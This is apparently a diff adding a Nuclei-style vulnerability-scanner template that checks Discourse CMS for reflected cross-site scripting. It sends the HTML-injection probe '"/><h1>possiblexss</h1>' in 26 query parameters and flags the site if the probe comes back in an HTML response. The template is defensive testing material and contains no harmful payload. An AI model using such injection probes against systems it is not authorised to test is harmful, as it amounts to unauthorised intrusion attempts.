@@ -1,0 +1,32 @@
+id: xss-alphabet
+
+info:
+  name: XSS alphabet
+  author: madrobot
+  severity: medium
+  description: Cross-site scripting (XSS) on Discourse CMS
+  tags: xss,discourse
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?a="/><h1>possiblexss</h1>&b="/><h1>possiblexss</h1>&c="/><h1>possiblexss</h1>&d="/><h1>possiblexss</h1>&e="/><h1>possiblexss</h1>&f="/><h1>possiblexss</h1>&g="/><h1>possiblexss</h1>&h="/><h1>possiblexss</h1>&i="/><h1>possiblexss</h1>&j="/><h1>possiblexss</h1>&k="/><h1>possiblexss</h1>&l="/><h1>possiblexss</h1>&m="/><h1>possiblexss</h1>&n="/><h1>possiblexss</h1>&o="/><h1>possiblexss</h1>&p="/><h1>possiblexss</h1>&q="/><h1>possiblexss</h1>&r="/><h1>possiblexss</h1>&s="/><h1>possiblexss</h1>&t="/><h1>possiblexss</h1>&u="/><h1>possiblexss</h1>&v="/><h1>possiblexss</h1>&w="/><h1>possiblexss</h1>&x="/><h1>possiblexss</h1>&y="/><h1>possiblexss</h1>&z="/><h1>possiblexss</h1>'
+    
+    
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '"/><h1>possiblexss</h1>'
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
